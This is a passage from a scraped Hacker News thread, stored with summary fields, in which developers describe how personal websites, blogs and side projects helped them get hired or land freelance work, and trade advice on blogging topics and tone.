more than academic credentials or \"years of experience\". If you are unable to show your work portfolio from those years, there is really no evidence for people to judge your work quality in development. This helps to distinguish between those who are developing software only as a 9 to 5 job, or those who love it and develop code on their free time as well. reply woodrowbarlow 6 hours agoprevi posted a blog (server's now offline though) on a technical topic and it sat on the frontpage of hacker news for about half a day, totaling about 100 points on HN; within a week i noticed a surge of messages from recruiters. most were, of course, useless bulk mailers but i did end up following through with one promising lead and made a good step up for my career. in my case i wouldn't say it opened new doors, per se, just made some doorways bigger. reply woodrowbarlow 4 hours agoparentregarding your final question, about whether or not to maintain a professional tone -- in my case, i didn't try very hard to seem professional. i used my all-lowercase style, informal constructions, mild humor. but the content was deeply technical. reply tmilard 7 hours agoprevI am 56 yo. Well, we know how people are when technical people like me get more mature. They could be afraid the guy might not be 'Up to date'... My personnal project I do on WE ( https://free-visit.net ) always gets me a nice technical interview and the consulting job. https://free-visit.net/fr/ In a way my personnal website sells myself. reply lifeisstillgood 7 hours agoparentThank you - I am in my early fifties and have “that book” still not written and “those oss projects” sitting unloved. That “up to date” comment rings true and is just the right motivation to get things sorted Plus I now want to make a virtual tour of some of my favourite places :-) reply tmilard 5 hours agorootparentHa ha ! When you want if you are in Europe (on WE) reply jacknews 7 hours agoparentprevExactly, mention your age and everyone assumes you're a COBOL, Turbo pascal or whatever programmer. reply tmilard 5 hours agorootparentYes a bit true. reply tmilard 5 hours agorootparentAnd also here at yc : - Younger you are, More likelyhood you will believe a guy in his 50s comes from the dinausaurus times. :-) reply jacknews 5 hours agorootparentReminds me a little of Twain: “When I was a boy of 14, my father was so ignorant I could hardly stand to have the old man around. But when I got to be 21, I was astonished at how much the old man had learned in seven years.” reply tmilard 4 hours agorootparentVery good one I did not know ! :-)) Everything is in reading the classics reply JohnFen 5 hours agoprevMy technical website never got me a permanent position, but did get me several interesting contract jobs over the years. That isn't a blog, though, so there's little in the way of narrative. It's mostly a collection of the source code to various projects I've done. reply gerardnico 8 hours agoprevI got involved in the oracle forum in 2005. I was just tired to answer always the same questions. I posted them online and got first for whatever reason on Google Search. That’s how datacadamia has started. I got my second job because of the forum, my third one because of my website. Not that they contacted me directly but during the technical interview, my interviewer was a reader and pretty excited to get me on the team. With an Ai era, it would have been more difficult I guess. The good side is that writing allows you to make connection in your brain and in the outside world. All the best reply factorialboy 6 hours agoprevFor traditional jobs, my LinkedIn profile and traded credentials helped more. For freelancing, my good old website, https://srirangan.net - which has seen several incarnations, has been a tremendous asset. I stopped blogging, writing essays. Rather, it's a statement for who I am, my values and work-ethic. Website born in 2003. :) reply austin-cheney 7 hours agoprevI started and maintained this software tool for about a decade. It was a code beautifier and diff tool. It got me hired multiple times. As a JavaScript developer writing open source applications eventually became a problem in regard to hiring. I could easily spin up an original application that does wonderful things, but other JavaScript developers can’t. I was no longer compatible to the employment. reply Sparkenstein 6 hours agoprevhttps://prabhanjan.dev Close, got tech interview at least, but they had a req for higher experience. Nothing fancy, but it's a \"terminal\" with xterm. Helps keeping \"Do you know REST and git?\" type of recruiters away at least. reply xrd 5 hours agoparentIt's terrific. I love it. reply CM30 8 hours agoprevEarlier in my career, my gaming site actually got me hired for my first web development related role. And I had a recent interview revolve around said site for at least one stage, with said topic probably one of the key reasons I got to the next stage. The YouTube channel seems to have helped quite a bit there too. Some companies see the sub count and are instantly intrigued lol. reply epolanski 8 hours agoprevIf you need motivation and you're looking for inspiration/direction about topics for blogging maybe you shouldn't blog at all. Blogging is a call one has for sharing his own ideas with the world. Blogging is where you can share what YOU care about, in the writing and detail style that you like. That's the only way you have to make it interesting and unique. reply xeonax 8 hours agoprevMaking a game and publishing it got me hired at my current job. Its not a gamedev job, but an enterprise SAAS. reply brunorsini 9 hours agoprevI've also been wondering about this question. It feels like society is increasingly valuing thinking in public, which hasn't really been my style. I've always preferred to think, debate and learn in smaller, almost always private chat groups and forums — yet I suspect this might end up hurting my career. reply epolanski 8 hours agoparentI don't think it's much a matter of society valuing rather than simple exposure and networking. If I blog about say, Clojure, and my articles are read by people in the Clojure community, it's likely that over time I may receive some emails about my availability for a Clojure role. reply JR1427 8 hours agoprevYes, I think so! In one of my interviews for a job I will start soon, I mentioned a side project and one interviewer pulled up my site there and then to look at it. I don't know that it made the difference, but I'm sure it helped! reply shepherdjerred 5 hours agoprevAt least two of my interviewers this year referenced my website as being why they were interested in me reply yoouareperfect 7 hours agoprev100% As an argentinean a way to stand out and have US companies look at me is through my dev blog https://mikealche.com reply blueappconfig 6 hours agoprevAbsolutely not. Out of the 3 jobs i have had all of them claimed they didn't look at my portfolio page. reply trashburger 7 hours agoprevNot a personal website, but putting my Free Software contributions and own projects on my CV helped me get my current job. reply patwoz 8 hours agoprevI got 2 projects through my personal website. I can tell that because the email on my website is unique and not mentioned anywhere else. patwoz.dev :) reply bugtodiffer 8 hours agoprevMy personal blog certainly has, it's good to show you actually do security research if you want a job that offers some time for that reply phrotoma 7 hours agoprevYes, it got me a full time job out of the blue. I am an operations type person and got thrown into using K8s at work in 2017 and Istio in 2021. I blogged about my struggles with both and the guy who would eventually hire me found my blog and liked what he read. He reached out saying he was developing an Istio training program and would I be interested in helping? I eventually took over as lead instructor for his small consultancy. Turns out I like teaching MUCH more than I like fixing prod. Edit: it is perhaps worth mentioning that my blog looks like absolute shit. It is literally a stock ghost.org blog with the vanilla theme and fuckall customization. reply me_bx 7 hours agoprevNot really, but perhaps I did not do it right. As a solo consultant back in the 2010's, I created a website and blog for personal branding purpose. * Blog articles about engineering, got well indexed on Google, getting me thousands of monthly visitors. * Articles about business / functional aspects never really got any visibility nor engagement. So in the end my content has been mostly helpful to peer developers (mostly in India and the US), and did not reach my potential clients / employers in Western Europe where I am located... I do not know how much effect the website had to recruiters, perhaps it still gave me extra points sometimes... reply giansegato 4 hours agoprevhigher ROI than anything else I've ever done for my career, by a long shot with my website [1] I found investors, I was contacted by a highly sought after silicon valley startup, moved to the US and got my visa sponsored, I even found friends here to get my network going and a professional network much more significant than anything I could ever have on linkedin the only downside is that writing on your blog takes a long time to become clearly worth it (read: years), so most people don't stick to it and never find out -- do it! [1] https://giansegato.com/essays reply Turboblack 9 hours agoprevI have always held the position: the best design is as little design as possible if you make a website - you need constant inspiration, and a theme that will be a constant companion, otherwise it will not be a website but just a stillborn plug. serious blogs are created when the author simply does not have a place inside himself, because the information itself spills out, and the blog is just a place where he puts it out. nothing more. and if you ask for advice on what is best - most likely it is better not to do it. or is it just a rhetorical question to check - how many interesting answers will there be for creating new blog topics? ))) reply ravenstine 6 hours agoprevOver 10 years ago (wow did time fly), I had a Rails-based site that could convert any YouTube channel to an RSS feed with audio streamed as MP3. This wouldn't be necessary today, but back then I couldn't afford an unlimited data plan, which is why I created this thing mostly for myself. I demo'd it while being interviewed for a software role at an NPR station. They were impressed because my project added pre-roll audio to every clip and supported scrubbing, which are features they worked on for their site and app. So yeah, I'm pretty sure that helped me get hired. reply bitxbitxbitcoin 3 hours agoprevI started my blog thehighestcritic.com in 2018 and have put everything I want on it since then. I know many of the opportunities I have today are a direct result of starting that blog. My tip is to lean nerdy. At the end of the day you’re going to have a better time with a group of attracted nerds than professionals. reply bschmidt1 4 hours agoprevI originally did this simple layout in 2012 (simple white, grid of projects) - https://www.bennyschmidt.com/ and have several times tried to more exciting things with Three.js, or the ole make my site look like an OS to showcase my UI skills thing, etc. but no matter how impressive these experiments are I get the most compliments on this one. Nothing over the top just \"I took a look at your site and loved X\" \"Nice portfolio!\" \"You have a good eye for design\" But I never got any comments on anything super creative and flashy. When I was exclusively looking for work in games my site was a game, but nobody cared. To game people it wasn't AAA and to tech people it wasn't Apple. Seems like simple and easy is best. When I have hired designers or FE devs I don't even interview them if they don't have a personal site. reply SebFender 8 hours agoprevThat's a great question - older and more of a writer than a video maker, it didn't get me directly hired, but it enabled me to refine my knowledge and skills which in turn may have given me a better chance when exchanging with others. I guess it was a great learning tool. reply PaulRobinson 6 hours agoprev [–] TLDR: Yes, do this. Back in 2006, I started my own little consultancy - I focused on Ruby on Rails (I was very early in that game - to my knowledge the first in the UK to specialise in it as a tech stack), had a lot of opinions on the Web 2.0 and tech scene more broadly, and very little cash to spend on marketing or any serious sales efforts. In short, my only option really was blogging. My company website was basically my tech blog. Whenever people googled me or my company name (I had business cards, I did a lot of free networking events too), the blog would come up. Every piece of work I got came from that blog or word of mouth. Kept me going for 4 years until it was time to go do something else. I think having a \"personal website\" in the form of a portfolio you add to and just link to from your CV might help more if you're a designer. A blog, or at least a set of articles/editorials/deeper thinking pieces, will help if you want to showcase you're not just another monkey in a seat at a future employer as a senior developer. It will pay a lot more dividends if you want to go free-lance. In terms of finding topics to write about, well, that's simpler than a lot of people make it. Whenever you're coding a side project, reading something on HN or elsewhere or watching a dev YT or whatever, ask yourself \"what do I think about this?\" and make a note in a dedicated note for ideas on your phone or in a notepad you keep nearby. If you consistently do this, after a week you'll have a list of lots of things you have thoughts about. Spot a pattern or theme? Cool, go write a blog post. Or two. Or five. A slightly more formal method for this is called a Zettelkasten. A lot of nonsense has been written about this (and as a method, it's produced some awful writing from people who didn't understand how to use it well), but I think a good primer for this is Bob Doto's \"A System for Writing\" - it breaks down how to capture ideas, thread them together into something to write about, and how to then produce some good writing. It's quite lightweight once you make it a small habit, and I've been reading this recently and found it a lot more helpful than other books on the method. In terms of tone - nerdy or professional - I would suggest you need to keep it authentic. Be you. However, be you in the context of you wanting to get hired, not you in the context of being out on a Saturday night with your friends. The tone should not be interview formal where you're trying to be the most professional you that you can ever be, but the you where you are in the office talking about the thing you're talking about to a colleague. In fact, just imagine you're talking to some of your existing colleagues: what would you say to them about this idea? Perhaps get some of them to proof read your drafts before you post. Try not to be too negative, cynical or sarcastic (not just on your blog, in life in general), and you'll find people out there thinking \"hmmm, maybe I'd like to work with this person some day\". reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "Many developers report that personal websites and blogs have significantly contributed to their career opportunities, including job offers, freelancing, and consulting work.",
      "Blogging about specific technologies or niche topics, such as React.js or multiplayer networking, can attract attention from recruiters and potential clients.",
      "Personal websites and blogs serve as portfolios that showcase skills, projects, and critical thinking, often coming up in interviews and influencing hiring decisions."
    ],
    "points": 92,
    "commentCount": 77,
    "retryCount": 0,
    "time": 1727340242
  }
]
